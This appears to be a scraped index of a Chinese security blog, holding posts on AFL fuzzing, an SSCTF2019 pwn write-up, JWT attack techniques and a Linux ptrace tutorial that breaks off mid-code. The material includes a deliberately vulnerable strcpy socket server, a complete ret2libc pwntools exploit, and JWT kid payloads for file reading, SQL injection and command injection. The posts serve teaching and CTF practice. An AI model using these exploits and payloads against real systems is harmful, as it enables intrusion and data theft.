for fuzzer findings - fuzz输出的数据存放目录 Execution control settings（扩展控制设置）: -f file - location read by the fuzzed program (stdin) - 指定编译文件的文件扩展名 -t msec - timeout for each run (auto-scaled, 50-1000 ms) - 指定程序超时时间 -m megs - memory limit for child process (50 MB) - 限制子进程使用的内存 -Q - use binary-only instrumentation (QEMU mode) - 使用qemu-mode进行二进制插桩 Fuzzing behavior settings（设置编译操作）: -d - quick \u0026 dirty mode (skips deterministic steps) - 不进行确定性变异，只进行随机性变异 -n - fuzz without instrumentation (dumb mode) - 不进行随机性编译，只进行确定性变异 -x dir - optional fuzzer dictionary (see README) - dictionary使用的用户指定token存放的目录 Other stuff（其他选项）: -T text - text banner to show on the screen - 在屏幕上显示的banner信息 -M / -S id - distributed mode (see parallel_fuzzing.txt) - 并行fuzz， —M为主节点，-S为子节点 -C - crash exploration mode (the peruvian rabbit thing) - 分析崩溃模式 For additional tips, please consult /usr/local/share/doc/afl/README. # 和`afl-cmin`、`afl-tmin`相同，默认向标准输入fuzz数据，如果被fuzz指令是从参数指定文件中读取数据，则使用`@@`替换文件参数 # 官方详细说明可以在项目根目录的'README.md'文件中查看 对已经进行过源码插桩的程序，基本指令为： afl-fuzz -i in_dir -o out_dir -- /path/to/fuzzed_app [ ... ] 对没有进行过源代码插桩的程序，基本指令为： afl-fuzz -i in_dir -o out_dir -Q -- /path/to/fuzzed_app [ ... ] afl-fuzz的运行特点是，不管系统真实为多少核，只使用其中一个，所以只运行一个fuzz进程会发现CPU使用率不高。不过afl-fuzz提供了并行fuzz的选项，并行运行时基本指令为： afl-fuzz -i in_dir -o out_dir [-Q] -M mast_name -- /path/to/fuzzed_app [ ... ] afl-fuzz -i in_dir -o out_dir [-Q] -S slave_name1 -- /path/to/fuzzed_app [ ... ] afl-fuzz -i in_dir -o out_dir [-Q] -S s","date":"2020-12-03","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:3:1","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 1","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"2. 基本使用样例 （注：测试过程中因为我安装了多个版本的afl和afl++，所以有些地方使用的是绝对路径，在只有单版本单环境变量的情况下，可以使用相对路径） 以djpeg程序为例进行，该程序可通过apt-get install libjpeg-progs进行安装，安装后直接就是二进制程序，所以使用的指令都带有-Q选项，如果要fuzz的程序编译时使用的是afl-gcc、afl-g++、afl-clang、afl-clang++、afl-clang-fast、afl-clang-fast++这些指令，fuzz的大致流程类似，只需要将命令中的-Q选项去掉即可。 通过 whereis djpeg 指令查看 djpeg 的绝对路径，一般情况下路径为 /usr/bin/djpeg whereis djpeg 创建两个目录 in_dir 和 out_dir ，分别用于存放我们输入的样本和afl的fuzz结果 mkdir in_dir mkdir out_dir 向 in_dir 中放入样本，这些样本可以自行收集，不过样本文件需要尽量小，否则变异阶段会花费较多时间，降低效率，这里我输入两个样本 1 和 2 ，内容分别为 hello 和 test，在准备一个很小的图片文件（可通过绘图工具截下一小块，以jpeg形式保存即可），命名为3放入样本目录中 echo 'hello' \u003e in_dir/1 echo 'test' \u003e in_dir/2 使用 afl-cmin 对输入样本集合进行裁剪，先创建一个输出目录 in_dir_min ，然后执行裁剪指令 mkdir in_dir_min afl-cmin -i in_dir -o in_dir_min -Q -- /usr/bin/djpeg @@ 裁剪过后目录中只保留了2 和 3. 使用 afl-tmin 对裁剪后集合中所有的样本进行大小裁剪（该步骤产生的裁剪后样本不一定要使用，需要通过 afl-analyze 指令进行裁剪前后对比分析，自行判断使用哪一个，裁剪前后两个样本一定只保留一个放入最终样本集中） afl-tmin -i in_dir_min/2 -o in_dir_min/2_min -Q -- /usr/bin/djpeg @@ afl-tmin -i in_dir_min/3 -o in_dir_min/3_min -Q -- /usr/bin/djpeg @@ 裁剪后得到的内容如下： 使用 afl-analyze 分别对裁剪前后的样本进行分析，先对比分析 3 和 3_min afl-analyze -i in_dir_min/3 -Q -- /usr/bin/djpeg @@ afl-analyze -i in_dir_min/3_min -Q -- /usr/bin/djpeg @@ 首先是对3的分析： 然后是对3_min的分析： afl-tmin 裁剪时遵循的是执行路径不变原则，但是也有可能破坏原文件中对某些标志数据，就如同上图 3 和 3_min 分析的结果，afl在识别文件结构时， 3 和 3_min 是不同的，这个不同会导致后续fuzz时变异阶段的不同，所以我认为在这种情况下 3_min 不能完全取代 3 。 再对比下 2 和 2_min afl-analyze -i in_dir_min/2 -Q -- /usr/bin/djpeg @@ afl-analyze -i in_dir_min/2_min -Q -- /usr/bin/djpeg @@ 同理，对比这两个样本，进行取舍。 最终，选取 2 和 3 作为最终样本集，即未进行 afl-tmin 裁剪的样本，放入新建的 in 目录中 mkdir in cp in_dir_min/2 in cp in_dir_min/3 in 使用 afl-fuzz 进行fuzz，这里采用并行fuzz模式，指令如下 afl-fuzz -i in -o out_dir -Q -M djpeg_master -- /usr/bin/djpeg @@ # 另一个终端 afl-fuzz -i in -o out_dir -Q -S djpeg_slaver_1 -- /usr/bin/djpeg @@ 至此，最基本的使用 afl 就差不多了，后续就是等待出现崩溃，分析崩溃了。 ","date":"2020-12-03","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:3:2","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 1","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"3. 运行状态说明 上面已经给出了AFL的运行时的状态图，官方对该界面的说明在 https://github.com/google/AFL/blob/master/docs/status_screen.txt ，或者在项目 docs/status_screen.txt 中查看。 下面对界面中各个部分做简单说明： Process timing：Fuzzer运行时长、以及距离最近发现的路径、崩溃和挂起经过了多长时间； Overall results：Fuzzer当前状态的概述； Cycle progress：我们输入队列的距离； Map coverage：目标二进制文件中的插桩代码所观察到覆盖范围的细节； Stage progress：Fuzzer现在正在执行的文件变异策略、执行次数和执行速度； Findings in depth：有关我们找到的执行路径，异常和挂起数量的信息； Fuzzing strategy yields：关于突变策略产生的最新行为和结果的详细信息； Path geometry：有关Fuzzer找到的执行路径的信息； CPU004：CPU利用率。 fuzz结果查看 单进程下fuzz结果的输出目录包含以下几个： crashes：存放去重后触发crash的数据 fuzz_bitmap：记录代码覆盖率 fuzzer_stats：fuzz状态 hangs：存放去重后触发挂起的数据 plot_data：绘图数据 queue：有效的样本集合 queque 目录下存放着有效的样本集合，我们可以从目录中文件的文件名得知样本是如何产生的，比如下图中 文件名中包含一些说明性字段： id：样本id orig：来自用户指定的样本集合，内容和对应的源样本一样 src：从哪些样本id变异而来 op：从变异的哪个阶段产生的 这样就可以得知有效样本的来源。 crashes 目录下存放着去重后触发崩溃的输入，我们可以从目录中文件的文件名得知数据是如何产生的，比如下图中 字段含义和 queque 目录中文件名基本一致。 ","date":"2020-12-03","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:3:3","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 1","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"4. 进阶使用 1. 使用AFL对端口程序进行fuzz 截止到目前为止，绝大多数的程序都是将‘标准输入’、‘参数指定文件中的数据’以及‘端口接收的数据’作为输入。前两者 afl 都可以很好的处理，但是不支持将变异数据输入到端口中，为了对这类程序进行fuzz，这里介绍一种不管有无源码都可以进行fuzz的方法。 这里使用preeny项目来进行测试，其中包含一些重写的系统库，在这里的测试中主要会使用重写的网络程序库，以实现从socket读取输入转为从标准输入读取输入。安装过程十分简单，进入项目主目录后，执行make进行变异，查看 x86_64-linux-gnu 下是否生成 .so 库文件即可。 这个库利用 LD_PRELOAD 机制，重写了很多库函数，其中 desock.c 这个文件负责重写 socket 相关的函数，其实现的功能就是当应用从 socket 获取输入时，改为从 stdin 获取输入。 首先准备一个socket程序，这里使用如下代码为例，文件名为 socket.c #include\u003cstdio.h\u003e #include\u003cstdlib.h\u003e #include\u003cstring.h\u003e #include\u003cunistd.h\u003e #include\u003csys/socket.h\u003e #include\u003cnetinet/in.h\u003e #define SERV_PORT 8000 #define SIZE 100 #define MAXLINE 64 int command(char* buf) { char recv[32]; memset(recv, 32, 0); strcpy(recv, buf + 8); return 0; } int main() { struct sockaddr_in servaddr,cliaddr; socklen_t cliaddr_len; int listenfd,connfd; char buf[MAXLINE]; int i,n,flag = 0; listenfd = socket(AF_INET,SOCK_STREAM,0); bzero(\u0026servaddr,sizeof(servaddr)); servaddr.sin_family = AF_INET; servaddr.sin_addr.s_addr = htonl(INADDR_ANY); servaddr.sin_port = htons(SERV_PORT); bind(listenfd,(struct sockaddr *)\u0026servaddr,sizeof(servaddr)); listen(listenfd,20); printf(\"Accepting connections..\\n\"); cliaddr_len = sizeof(cliaddr); connfd = accept(listenfd,(struct sockaddr *)\u0026cliaddr,\u0026cliaddr_len); char send_msg[MAXLINE*2] = \"hello, send by send() :\\n\"; send(connfd, send_msg, strlen(send_msg), 0); n = read(connfd,buf,MAXLINE); if(n!=0){ if(!strncmp(buf, \"test \", 5)) sprintf(send_msg, \"test: %s\\n\", buf + 5); else if(!strncmp(buf, \"help\", 4)) sprintf(send_msg, \"help:\\n\\ttest\\n\\tcommand\\n\\texit\\n\"); else if(!strncmp(buf, \"command \", 8)){ command(buf); sprintf(send_msg, \"it's a command\\n\"); } else if(!strncmp(buf, \"exit\", 4)) send(connfd, \"bye~\\n\", 4, 0); else sprintf(send_msg, \"unknown command!\\n\"); send(connfd, send_msg, strlen(send_msg), 0); } else printf(\"Client say close the connection..\\n\"); close(connfd); } 使用 gcc 进行编译 gcc -o socket socket.c 运行 socket 可以监听 8000 端口进行socket通信 通过设置 LD_PRELOAD 使程序加载 preeny 项目中编译出来的 desock.so 库（一般在 preeny 项目下的 x86_64-linux-gnu 目录中）来改变socket通信，具体指令如下（我的 desock.so 路径为 /root/Tools/preeny/x86_64-linux-gnu/desock.so） # 指令格式： LD_PRELOAD=\"preeny编译出的desock.so的路径\" socket程序 [参数] LD_PRELOAD=\"/home/v4ler1an/Desktop/Fuzz/training/preeny/x86_64-linux-gnu/desock.so\" ./socket 最终实现的结果如下： 从上面的结果可以看到 send 函数成功将消息发往了 stdout，recv 函数也成功从 stdin 中接收了消息。 这样就将 socket 输入转变为了标准输入，进而可以使用afl进行fuzz了。过程如下： # 创建样本及输出目录 mkdir in mkdir out # 创建样本 echo 'test 123' \u003e in/test echo 'xxx' \u003e in/xxx echo 'help' \u003e in/help echo 'exit' \u003e in/exit # 对样本进行裁剪 mkdir in_min LD_PRELOAD=\"/home/v4ler1an/Desktop/Fuzz/training/preeny/x86_64-linux-gnu/desock.so\" afl-cmin -i in -o in_min -Q -- ./socket # 开始fuzz LD_PRELOAD=\"/home/v4ler1an/Desktop/Fuzz/training/preeny/x86_64-linux-gnu/desock.so\" afl-fuzz -i in_min/ -o out/ -Q -- ./socket 成功执行后如下： 从上面的结果可以看出这种方式存在的问题： fuzz效率很低 如果socket程序是循环接收数据的，因为fuzz只能对程序进行一次输入，所以被fuzz程序在处理完这个输入后会一直保持等待，最终导致超时，而afl对超时的处理可以简单理解为忽略，所以针对这种socket程序是无法进行fuzz的，实战中绝大多数都是循环接收数据的程序，所以这种方案实际的可行性有待考虑。 2. 使用llvm模式进行fuzz 因为使用这个模式需要修改源代码，所以只有对有源码的程序进行fuzz时才能使用。 可在项目 llvm_mode 目录下的 README.llvm 文件中查看官方文档 将上面的代码改成循环读取的形式，新代码如下： #include\u003cstdio.h\u003e #include\u003cstdlib.h\u003e #include\u003cstring.h\u003e #include\u003cunistd.h\u003e #include\u003csys/socket.h\u003e #include\u003cnetinet/in.h\u003e #define SERV_PORT 8000 #define SIZE 100 #define MAXLINE 64 int command(char* buf) { char recv[32]; memset(recv, 32, 0); strcpy(recv, buf + 8); return 0; } int main() { struct sockaddr_in servaddr,cliaddr; socklen_t cliaddr_len; int listenfd,connfd; char buf[MAXLINE]; int i,n,flag = 0; listenfd = socket(AF_INET,SOCK_STREAM,0); bzero(\u0026servaddr,sizeof(servaddr)); servaddr.sin_family = AF_INET; servaddr.sin_addr.s_addr = htonl(INADDR_ANY); servaddr.sin_port = htons(SERV_PORT); bind(listenfd,(struct sockaddr *)\u0026servaddr,sizeof(servaddr)); listen(listenfd,20); printf(\"Accepting connections..\\n\"); while(1){ cliaddr_len = sizeof(cliaddr); connfd = accept(listenfd,(struct sockaddr *)\u0026cliaddr,\u0026cliaddr_len); char send_msg[MAXLINE*2] = \"hello, send by send() :\\n\";","date":"2020-12-03","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:3:4","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 1","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"四、总结 以上为AFL的基本知识和基本使用方法，仍然属于比较基层的内容，后续将进行源码分析和更多的实例训练的相关内容。 ","date":"2020-12-03","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:4:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 1","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["CTF"],"content":"SSCTF2019 PWN题题解","date":"2020-11-25","objectID":"/2020/11/roarctf/","tags":["pwn"],"title":"SSCTF2019 PWN题题解","uri":"/2020/11/roarctf/"},{"categories":["CTF"],"content":"SSCTF2019 PWN题题解 ","date":"2020-11-25","objectID":"/2020/11/roarctf/:0:0","tags":["pwn"],"title":"SSCTF2019 PWN题题解","uri":"/2020/11/roarctf/"},{"categories":["CTF"],"content":"stackpwn 首先file,checsec走一遍，64位程序，动态链接，开了NX IDA直接看，main函数： 进入vuln看一下： 容易看出，存在溢出点，且v1到返回地址的距离为(0x10 + 0x8 = 0x18)。 到此为止，我们大致明白了程序的流程：通过vuln函数进行栈溢出，但是程序没有给出system函数，所以需要我们进行两次利用，第一次利用进行地址泄漏，需要使用ROP，第二次真实进行攻击。 基本思路是首先泄漏出puts函数的实际地址（因为在main函数和溢出之前都使用过了，所以程序内存中存在puts函数的真实地址.使用pop rdi;ret将got表中的存放的puts函数的真实地址利用plt表中的puts函数打印出来，我泄漏我自己），然后泄漏libc的基地址，然后获取system函数的实际地址（libc基地址+system偏移地址）；程序中有/bin/sh字符串，所以直接用就可以了。 ","date":"2020-11-25","objectID":"/2020/11/roarctf/:1:0","tags":["pwn"],"title":"SSCTF2019 PWN题题解","uri":"/2020/11/roarctf/"},{"categories":["CTF"],"content":"Exp： from pwn import * context.log_level = 'debug' p = process('./stackpwn') offset = 0x18 #0x10+0x8 pop_rdi_ret = 0x0000000000400933 #ROPgadet : rdi bin_sh = 0x0000000000400954 # address of /bin/sh elf = ELF(\"./stackpwn\") libc = elf.libc # leak libc payload = 'A'*offset + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x00000000004007E7) #last address is main address p.recvuntil(\"instructions...\\n\") p.sendline(payload) #get puts address puts_addr = u64(p.recv(6).ljust(8,'\\x00')) #get libc address puts_base = libc.symbols['puts'] libc_base = puts_addr - puts_base #get system address sys_addr = libc_base + libc.symbols['system'] #second loop payload2 = 'A'*offset + p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_addr) p.sendline(payload2) p.interactive() ","date":"2020-11-25","objectID":"/2020/11/roarctf/:1:1","tags":["pwn"],"title":"SSCTF2019 PWN题题解","uri":"/2020/11/roarctf/"},{"categories":["Misc"],"content":"JWT认证和攻击界面简单总结","date":"2020-11-03","objectID":"/2020/11/jwt/","tags":["JWT"],"title":"JWT认证和攻击界面简单总结","uri":"/2020/11/jwt/"},{"categories":["Misc"],"content":"JWT认证和攻击界面简单总结 ","date":"2020-11-03","objectID":"/2020/11/jwt/:0:0","tags":["JWT"],"title":"JWT认证和攻击界面简单总结","uri":"/2020/11/jwt/"},{"categories":["Misc"],"content":"JWT简述 Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。 ","date":"2020-11-03","objectID":"/2020/11/jwt/:1:0","tags":["JWT"],"title":"JWT认证和攻击界面简单总结","uri":"/2020/11/jwt/"},{"categories":["Misc"],"content":"JWT认证和session认证的区别 1. session认证 http协议是一种无状态的协议，即其对事务处理没有记忆能力，不对请求和响应之间的通信状态进行保存。如果用户向应用提供了用户名和密码来进行用户认证，那么在进行下一次请求时，需要再次进行用户认证。因为使用http协议并不能明确是哪个用户发送的请求。 为了实现应用可以识别出发出请求的用户，需要在server上存储一份用户登录的信息，这份登录信息会在server响应时传递给client，告诉其保存为cookie，以便下次请求时发送给应用。这样，就可以识别出发出请求的用户。以上即为传统的基于session的认证。 Cookie的传递过程 浏览器向URL发送请求 server生成response 在响应头中加入Set-Cookie字段，值为要设置的Cookie 浏览器接受到response 浏览器在响应头中搜索Set-Cookie字段，并将值保存在内存或硬盘中 当下一次向该server发送http请求时，将server设置的Cookie附加在http请求的字段Cookie中 server收到请求，发现头部有Cookie字段，则明确已处理过该用户的请求 过期的Cookie会被删除 基于Cookie—Session的验证过程 用户输入登录信息 server验证信息是否正确，如果正确就为该用户创建一个Session，并把Session存入数据库 server向client返回带有sessionID的Cookie client接收到server返回的响应，发现头部有Set-Cookie字段，将Cookie进行保存 后续client的请求都会附带该Cookie，server将sessionID与数据库中的做匹配，如果一直则处理该请求 用户登出，Session会在client和server都被销毁 Cookie-Session机制的缺陷 跨域问题，Cookie属于同源策略限制的内容之一 Session保存在server，容易遭受DoS攻击 扩展性低，多台server较难实现Session共享 安全性低，attacker可以利用本地Cookie进行欺骗和CSRF攻击 2. JWT认证 基于Token的鉴权机制也是无状态的，但它不徐奥server存储用户的认证信息或会话信息。 JWT组成 JWT由3部分组成：header、payload、signature，每个部分中间使用.进行分隔，其中，header和payload使用Base64URL进行编码，即： base64UrlEncode(header).base64UrlEncode(payload).signature header部分是一个JSON对象，用来描述JWT的元数据： { \"typ\": \"JWT\", // 表示对象是一个 JWT \"alg\": \"HS256\" // 表示使用哪种 Hash 算法来创建签名，这里是 HMAC-SHA256 } payload部分也是一个JSON对象，存储实际需要传递的数据，其内容可以是官方定义的7个字段，也可以是自定义的私有字段： { \"sub\": \"title\", \"iat\": 1605688497, \"exp\": 9999999999, \"name\": \"V4ler1an\" } JWT默认不进行加密，所以该部分不要存放关键信息。 signature是对前2部分的签名，防止数据被篡改。这里需要传入一个key作为加密的私钥： key = \"secret\" data = base64urlEncode(header) + \".\" + base64urlEncode(payload); signature = HMAC-SHA256(key，data); 一个样例JWT如下： JWT认证流程 用户使用账号和密码发出post请求 server使用私钥创建一个JWT，并返回给浏览器 浏览器将该JWT串放在请求头的Authorization中: Authorization: Bearer \u003ctoken\u003e, 发送给server server对JWT进行验证 验证通过后返回相应的资源给浏览器 用户登出，client删除token，server不做处理 JWT缺陷 默认不加密 只验证来源可靠性，并不对数据进行保护，也不会防止未授权访问。只要获取到token，任意用户都可以通过验证。为减少盗用，JWT的有效期应该设置尽可能短 Token过期问题，因为server不保存Session状态，所以无法在使用过程中废止或更改权限。即JWT一旦签发，到期前会始终有效。 JWT攻击界面 爆破私钥key。如果signature的加密私钥key为已知，理论上来说可以通过爆破获得，且已有爆破工具可以直接使用 修改算法， 将非对称加密算法修改为对称加密算法。HS256使用私密密钥对每条消息进行签名和验证，这也是JWT默认使用的算法，RS256使用私钥对消息进行签名，并使用公钥进行验证。可以将算法RS256更改为HS256，后端代码会使用公钥作为私密密钥，然后使用HS256验证签名。即想办法获取到RS256的公钥，然后修改算法为HS256，然后使用RSA公钥对数据签名，后端代码使用RSA公钥+HS256算法签名，从而实现绕过。 修改算法为none，即将header中的alg字段修改为none。这种方式只适合一些低版本的JWT库。当设置为none时表示没有签名算法，后端不会进行签名校验，此时去掉JWT的signature数据，然后直接提交给服务端即可。 修改KID参数。kid是header中的一个可选参数，全称key ID，用于指定加密算法的密钥： { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"/home/jwt/.ssh/pem\" } 该参数可以由用户输入。常见的有以下几种攻击方式： 任意文件读取 kid参数用于读取密钥文件，但系统并不知道用户想要读取的是否是密钥文件。所以，如果没有对参数进行过滤，那么攻击折可以读取到系统的任意文件。 { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"/etc/passwd\" } SQL注入 kid也可以从数据库中提取数据，此时有可能造成SQL攻击，通过构造SQL语句来获取数据或绕过signature的验证。 { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"key111111' || union select 'secretkey' -- \" } 命令注入 利用条件苛刻。ruby语言需要使用open函数读取密钥文件，可以命令注入。 \"/path/to/key_file|whoami\" 如果是php语言，则需要使用exec或system函数读取密钥文件，可能性较小。 信息泄露。由于JWT的初衷并不是保证传输数据的机密性，所以payload是直接使用base64url编码的。如果在payload中携带了敏感信息，可以直接进行base64url解码，从而读取到payload中的关键信息。 ","date":"2020-11-03","objectID":"/2020/11/jwt/:1:1","tags":["JWT"],"title":"JWT认证和攻击界面简单总结","uri":"/2020/11/jwt/"},{"categories":["LINUX"],"content":"Linux ptrace 详解","date":"2020-10-27","objectID":"/2020/10/ptrace/","tags":["ptrace"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"Linux ptrace 详解 备注：文章中使用的Linux内核源码版本为Linux 5.9，使用的Linux版本为Linux ubuntu 5.4.0-65-generic ","date":"2020-10-27","objectID":"/2020/10/ptrace/:0:0","tags":["ptrace"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"一、简述 ptrace系统调用提供了一个进程(tracer)可以控制另一个进程(tracee)运行的方法，并且tracer可以监控和修改tracee的内存和寄存器，主要用作实现断点调试和系统调用跟踪。 tracee首先要被attach到tracer上，这里的attach以线程为对象，在多线程场景（这里的多线程场景指的使用clone CLONE_THREAD flag创建的线程组）下，每个线程可以分别被attach到tracer上。ptrace的命令总是以下面的调用格式发送到指定的tracee上： ptrace(PTRACE_foom, pid, ...) // pid为linux中对应的线程ID 一个进程可以通过调用fork()函数来初始化一个跟踪，并让生成的子进程执行PTRACE_TRACEME，然后执行execve(一般情况下)来启动跟踪。进程也可以使用PTRACE_ATTACH或PTRACE_SEIZE进行跟踪。 当处于被跟踪状态时，tracee每收到一个信号就会stop，即使是某些时候信号是被忽略的。tracer将在下一次调用waitpid或与wait相关的系统调用之一）时收到通知。该调用会返回一个状态值，包含tracee停止的原因。tracee发生stop时，tracer可以使用各种ptrace的request来检查和修改tracee。然后，tracer使tracee继续运行，选择性地忽略所传递的信号（甚至传递一个与原来不同的信号）。 当tracer结束跟踪后，发送PTRACE_DETACH信号释放tracee，tracee可以在常规状态下继续运行。 ","date":"2020-10-27","objectID":"/2020/10/ptrace/:1:0","tags":["ptrace"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"二、函数原型及初步使用 ","date":"2020-10-27","objectID":"/2020/10/ptrace/:2:0","tags":["ptrace"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"1. 函数原型 ptrace的原型如下： long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); 其中request参数表明执行的行为（后续将重点介绍）， pid参数标识目标进程，addr参数表明执行peek和poke操作的地址，data参数则对于poke操作，指明存放数据的地址，对于peek操作，指明获取数据的地址。 返回值，成功执行时，PTRACE_PEEK请求返回所请求的数据，其他情况时返回0，失败则返回-1。errno被设置为 ","date":"2020-10-27","objectID":"/2020/10/ptrace/:2:1","tags":["ptrace"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"2. 函数定义 ptrace的内核实现在kernel/ptrace.c文件中，内核接口是SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr, unsigned long, data)，从中可以看到整个代码逻辑比较简单，其中对PTRACE_TRACEME和PTRACE_ATTACH 是做特殊处理的。其他的是与架构相关的。 SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr,unsigned long, data) { struct task_struct *child; long ret; if (request == PTRACE_TRACEME) { ret = ptrace_traceme(); if (!ret) arch_ptrace_attach(current); goto out; } child = find_get_task_by_vpid(pid); if (!child) { ret = -ESRCH; goto out; } if (request == PTRACE_ATTACH || request == PTRACE_SEIZE) { ret = ptrace_attach(child, request, addr, data); /* * Some architectures need to do book-keeping after * a ptrace attach. */ if (!ret) arch_ptrace_attach(child); goto out_put_task_struct; } ret = ptrace_check_attach(child, request == PTRACE_KILL || request == PTRACE_INTERRUPT); if (ret \u003c 0) goto out_put_task_struct; ret = arch_ptrace(child, request, addr, data); if (ret || request != PTRACE_DETACH) ptrace_unfreeze_traced(child); out_put_task_struct: put_task_struct(child); out: return ret; } 系统调用都改为了SYSCALL_DEFINE的方式。如何获得上面的定义的呢？这里需要穿插一下SYSCALL_DEFINE的定义(syscall.h): #define SYSCALL_DEFINE1(name, ...) SYSCALL_DEFINEx(1, _##name, __VA_ARGS__) #define SYSCALL_DEFINE2(name, ...) SYSCALL_DEFINEx(2, _##name, __VA_ARGS__) #define SYSCALL_DEFINE3(name, ...) SYSCALL_DEFINEx(3, _##name, __VA_ARGS__) #define SYSCALL_DEFINE4(name, ...) SYSCALL_DEFINEx(4, _##name, __VA_ARGS__) #define SYSCALL_DEFINE5(name, ...) SYSCALL_DEFINEx(5, _##name, __VA_ARGS__) #define SYSCALL_DEFINE6(name, ...) SYSCALL_DEFINEx(6, _##name, __VA_ARGS__) 宏定义进行展开： #define SYSCALL_DEFINEx(x, sname, ...) \\ SYSCALL_METADATA(sname, x, __VA_ARGS__) \\ __SYSCALL_DEFINEx(x, sname, __VA_ARGS__) /* * The asmlinkage stub is aliased to a function named __se_sys_*() which * sign-extends 32-bit ints to longs whenever needed. The actual work is * done within __do_sys_*(). */ #ifndef __SYSCALL_DEFINEx #define __SYSCALL_DEFINEx(x, name, ...) \\ __diag_push(); \\ __diag_ignore(GCC, 8, \"-Wattribute-alias\", \\ \"Type aliasing is used to sanitize syscall arguments\");\\ asmlinkage long sys##name(__MAP(x,__SC_DECL,__VA_ARGS__)) \\ __attribute__((alias(__stringify(__se_sys##name)))); \\ ALLOW_ERROR_INJECTION(sys##name, ERRNO); \\ static inline long __do_sys##name(__MAP(x,__SC_DECL,__VA_ARGS__));\\ asmlinkage long __se_sys##name(__MAP(x,__SC_LONG,__VA_ARGS__)); \\ asmlinkage long __se_sys##name(__MAP(x,__SC_LONG,__VA_ARGS__)) \\ { \\ long ret = __do_sys##name(__MAP(x,__SC_CAST,__VA_ARGS__));\\ __MAP(x,__SC_TEST,__VA_ARGS__); \\ __PROTECT(x, ret,__MAP(x,__SC_ARGS,__VA_ARGS__)); \\ return ret; \\ } \\ __diag_pop(); \\ static inline long __do_sys##name(__MAP(x,__SC_DECL,__VA_ARGS__)) #endif /* __SYSCALL_DEFINEx */ __SYSCALL_DEFINEx中的x表示系统调用的参数个数，且sys_ptrace的宏定义如下： /* kernel/ptrace.c */ asmlinkage long sys_ptrace(long request, long pid, unsigned long addr, unsigned long data); 所以对应的__SYSCALL_DEFINEx应该是SYSCALL_DEFINE4，这与上面的定义SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr, unsigned long, data)一致。 仔细观察上面的代码可以发现，函数定义其实在最后一行，结尾没有分号，然后再加上花括号即形成完整的函数定义。前面的几句代码并不是函数的实现（详细的分析可以跟踪源码，出于篇幅原因此处不放出每个宏定义的跟踪）。 定义的转换过程： SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr, unsigned long, data) --\u003e SYSCALL_DEFINEx(4, _ptrace, __VA_ARGS__) --\u003e __SYSCALL_DEFINEx(4, __ptrace, __VA_ARGS__) #define __SYSCALL_DEFINEx(x, name, ...) \\ asmlinkage long sys##name(__MAP(x,__SC_DECL,__VA_ARGS__)) \\ --\u003e asmlinkage long sys_ptrace(__MAP(4,__SC_DECL,__VA_ARGS__)) 而对__MAP宏和__SC_DECL宏的定义如下： /* * __MAP - apply a macro to syscall arguments * __MAP(n, m, t1, a1, t2, a2, ..., tn, an) will expand to * m(t1, a1), m(t2, a2), ..., m(tn, an) * The first argument must be equal to the amount of type/name * pairs given. Note that this list of pairs (i.e. the arguments * of __MAP starting at the third one) is in the same format as * for SYSCALL_DEFINE\u003cn\u003e/COMPAT_SYSCALL_DEFINE\u003cn\u003e */ #define __MAP0(m,...) #define __MAP1(m,t,a,...) m(t,a) #define __MAP2(m,t,a,","date":"2020-10-27","objectID":"/2020/10/ptrace/:2:2","tags":["ptrace"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"2. 初步使用 1. 最简单的ls跟踪 首先通过一个简单的例子来熟悉一下ptrace的使用： #include \u003cstdio.h\u003e #include \u003cunistd.h\u003e #include \u003csys/ptrace.h\u003e #include \u003csys/wait.h\u003e #include \u003csys/reg.h\u003e #include \u003csys/types.h\u003e int main(int argc, char *argv[]){ pid_t child; long orig_rax; child = fork(); if(child == 0){ ptrace(PTRACE_TRACEME, 0, NULL, NULL); // Tell kernel, trace me execl(\"/bin/ls\", \"ls\", NULL); }else{ /*Receive certification after child process stopped*/ wait(NULL); /*Read child process's rax*/ orig_rax = ptrace(PTRACE_PEEKUSER, child, 8*ORIG_RAX, NULL); printf(\"[+] The child made a system call 